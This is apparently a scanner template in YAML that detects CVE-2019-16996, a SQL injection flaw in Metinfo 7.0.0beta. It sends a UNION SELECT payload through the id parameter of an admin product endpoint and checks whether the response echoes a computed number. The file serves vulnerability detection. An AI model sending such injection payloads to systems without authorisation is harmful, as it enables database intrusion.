id: CVE-2019-16996

info:
  name: Metinfo 7.0.0beta SQL Inject
  author: JingLing
  severity: critical
  verified: false
  description: |
    Metinfo 7.0.0beta is vulnerable to SQL injection via the id parameter in the /admin/?n=product&c=product_admin&a=dopara&app_type=shop endpoint.
  reference:
    - https://www.exploit-db.com/exploits/48142
    - https://nvd.nist.gov/vuln/detail/CVE-2019-16996
  tags: cve,cve2019,sqli,metinfo
  created: 2023/08/10

set:
  r1: randomInt(40000, 44800)
  r2: randomInt(40000, 44800)
rules:
  r0:
    request:
      method: GET
      path: /admin/?n=product&c=product_admin&a=dopara&app_type=shop&id=1%20union%20SELECT%201,2,3,{{r1}}*{{r2}},5,6,7%20limit%205,1%20%23
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
expression: r0()
